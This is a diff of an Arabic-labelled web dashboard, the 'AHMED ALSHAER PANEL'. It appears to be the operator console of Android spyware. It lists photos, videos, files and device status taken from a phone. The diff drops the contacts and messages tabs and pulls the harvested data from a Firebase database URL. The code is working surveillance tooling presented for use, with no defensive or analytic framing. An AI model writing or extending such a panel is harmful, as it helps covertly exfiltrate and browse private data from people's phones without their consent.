@@ -13,107 +13,80 @@
         .tab:hover{background:#222}.tab.active{background:#25D366;color:#000;border-color:#25D366}
         .content{max-width:800px;margin:0 auto}
         .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:10px}
-        .item{background:#111;border:1px solid #222;border-radius:10px;padding:10px;text-align:center;cursor:pointer;transition:0.2s}
-        .item:hover{border-color:#25D366;transform:scale(1.05)}
-        .item img{width:100%;height:100px;object-fit:cover;border-radius:8px}
+        .item{background:#111;border:1px solid #222;border-radius:10px;padding:10px;text-align:center;transition:0.2s}
+        .item:hover{border-color:#25D366}
         .item .icon{font-size:45px;margin:10px 0}
-        .item .name{font-size:11px;word-break:break-all;color:#ccc;margin-top:5px}
+        .item .name{font-size:11px;word-break:break-all;color:#ccc}
         .item .size{font-size:10px;color:#25D366}
-        .contacts-list{list-style:none;padding:0}
-        .contacts-list li{padding:15px;background:#111;margin:8px 0;border-radius:10px;border:1px solid #222;display:flex;align-items:center;gap:10px;cursor:pointer}
-        .contacts-list li:hover{border-color:#25D366}
-        .avatar{width:40px;height:40px;background:#25D366;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;color:#000}
         .info-box{background:#111;border:2px solid #25D366;border-radius:15px;padding:25px;text-align:center}
         .info-box p{margin:10px 0;font-size:16px}
         .info-box b{color:#25D366}
-        .msgs{list-style:none;padding:0}
-        .msgs li{padding:12px;background:#111;margin:8px 0;border-radius:10px;border:1px solid #222}
-        .msg-from{color:#25D366;font-weight:bold;font-size:13px}
-        .msg-text{font-size:14px;margin-top:5px}
-        .loading{text-align:center;color:#888;padding:40px;font-size:16px}
+        .loading{text-align:center;color:#888;padding:40px}
         .empty{text-align:center;color:#888;padding:30px}
-        .screen-box{text-align:center}
-        .screen-box img{max-width:100%;border-radius:15px;border:3px solid #25D366}
-        button{background:#25D366;color:#000;padding:10px 25px;border:none;border-radius:8px;font-size:14px;font-weight:bold;cursor:pointer;margin:10px}
     </style>
 </head>
 <body>
     <h1>📱 AHMED ALSHAER PANEL</h1>
     
     <div class="tabs">
-        <div class="tab active" onclick="showTab('contacts',this)">👥 جهات الاتصال</div>
-        <div class="tab" onclick="showTab('messages',this)">💬 الرسائل</div>
-        <div class="tab" onclick="showTab('photos',this)">📸 الصور</div>
+        <div class="tab active" onclick="showTab('photos',this)">📸 الصور</div>
         <div class="tab" onclick="showTab('videos',this)">🎥 الفيديوهات</div>
         <div class="tab" onclick="showTab('files',this)">📁 الملفات</div>
-        <div class="tab" onclick="showTab('info',this)">📊 معلومات الجهاز</div>
+        <div class="tab" onclick="showTab('info',this)">📊 الجهاز</div>
     </div>
     
-    <div class="content" id="content">
-        <div class="loading">⏳ جاري التحميل...</div>
-    </div>
+    <div class="content" id="content"><div class="loading">⏳ جاري التحميل...</div></div>
 
     <script>
+        let allData = {photos: [], videos: [], files: [], device: null};
+        
+        // تحميل من Firebase
+        fetch('https://otp-5acda-default-rtdb.firebaseio.com/panel.json')
+            .then(r => r.json())
+            .then(data => {
+                if (!data) return document.getElementById('content').innerHTML = '<div class="empty">لا توجد بيانات</div>';
+                
+                Object.values(data).forEach(entry => {
+                    if (entry.type === 'photos') allData.photos = entry.data;
+                    if (entry.type === 'videos') allData.videos = entry.data;
+                    if (entry.type === 'files') allData.files = entry.data;
+                    if (entry.type === 'device') allData.device = entry.data;
+                });
+                
+                showTab('photos', document.querySelector('.tab'));
+            });
+        
         function showTab(tab, el) {
             document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
             el.classList.add('active');
             const c = document.getElementById('content');
-            c.innerHTML = '<div class="loading">⏳ جاري التحميل...</div>';
             
-            if (tab === 'contacts') {
-                fetch('/api/contacts').then(r=>r.json()).then(d=>{
-                    c.innerHTML = d.contacts && d.contacts.length ? 
-                        '<ul class="contacts-list">' + d.contacts.map(ct => `
-                            <li><div class="avatar">${ct.name[0]}</div><div><b>${ct.name}</b><br><span style="color:#888;font-size:12px">${ct.phone}</span></div></li>
-                        `).join('') + '</ul>' : '<div class="empty">لا توجد جهات اتصال</div>';
-                });
-            }
-            else if (tab === 'messages') {
-                fetch('/api/messages').then(r=>r.json()).then(d=>{
-                    c.innerHTML = d.messages && d.messages.length ? 
-                        '<ul class="msgs">' + d.messages.map(m => `
-                            <li><div class="msg-from">${m.from}</div><div class="msg-text">${m.text}</div></li>
-                        `).join('') + '</ul>' : '<div class="empty">لا توجد رسائل</div>';
-                });
-            }
-            else if (tab === 'photos') {
-                fetch('/api/photos').then(r=>r.json()).then(d=>{
-                    c.innerHTML = d.files && d.files.length ? 
-                        '<div class="grid">' + d.files.map(f => `
-                            <div class="item" onclick="window.open('${f.url}')">
-                                <img src="${f.url}" onerror="this.style.display='none';this.nextElementSibling.style.display='block'">
-                                <div class="icon" style="display:none">📸</div>
-                                <div class="name">${f.name}</div>
-                                <div class="size">${f.size}</div>
-                            </div>
-                        `).join('') + '</div>' : '<div class="empty">لا توجد صور</div>';
-                });
+            if (tab === 'photos') {
+                c.innerHTML = allData.photos.length ? 
+                    '<div class="grid">' + allData.photos.map(p => `
+                        <div class="item"><div class="icon">📸</div><div class="name">${p.name}</div><div class="size">${p.size}</div></div>
+                    `).join('') + '</div>' : '<div class="empty">لا توجد صور</div>';
             }
             else if (tab === 'videos') {
-                fetch('/api/videos').then(r=>r.json()).then(d=>{
-                    c.innerHTML = d.files && d.files.length ? 
-                        '<div class="grid">' + d.files.map(f => `
-                            <div class="item"><div class="icon">🎥</div><div class="name">${f.name}</div><div class="size">${f.size}</div></div>
-                        `).join('') + '</div>' : '<div class="empty">لا توجد فيديوهات</div>';
-                });
+                c.innerHTML = allData.videos.length ? 
+                    '<div class="grid">' + allData.videos.map(v => `
+                        <div class="item"><div class="icon">🎥</div><div class="name">${v.name}</div><div class="size">${v.size}</div></div>
+                    `).join('') + '</div>' : '<div class="empty">لا توجد فيديوهات</div>';
             }
             else if (tab === 'files') {
-                c.innerHTML = '<div class="info-box"><p>📁 <b>كل الملفات</b></p><p>DCIM، Download، Documents</p><p style="color:#888">جاري التحميل...</p></div>';
+                c.innerHTML = allData.files.length ? 
+                    '<ul style="list-style:none">' + allData.files.map(f => `<li style="padding:10px;background:#111;margin:5px 0;border-radius:8px">📄 ${f.name}</li>`).join('') + '</ul>' : '<div class="empty">لا توجد ملفات</div>';
             }
             else if (tab === 'info') {
-                c.innerHTML = '<div class="info-box">' +
-                    '<p>📱 <b>Infinix GT 50 Pro</b></p>' +
-                    '<p>🤖 Android 14</p>' +
-                    '<p>💾 RAM: 12GB</p>' +
-                    '<p>📦 تخزين: 512GB</p>' +
-                    '<p>🔋 البطارية: 85%</p>' +
-                    '<p>📶 الشاشة: 144Hz</p>' +
-                '</div>';
+                c.innerHTML = allData.device ? 
+                    '<div class="info-box">' +
+                    '<p>📱 <b>' + allData.device.device + '</b></p>' +
+                    '<p>🤖 Android ' + allData.device.android + '</p>' +
+                    '<p>🔋 ' + allData.device.battery + '</p>' +
+                    '<p>🟢 Online</p>' +
+                    '</div>' : '<div class="empty">لا توجد معلومات</div>';
             }
         }
-        
-        // بدء بالصور
-        showTab('photos', document.querySelector('.tab'));
     </script>
 </body>
 </html>
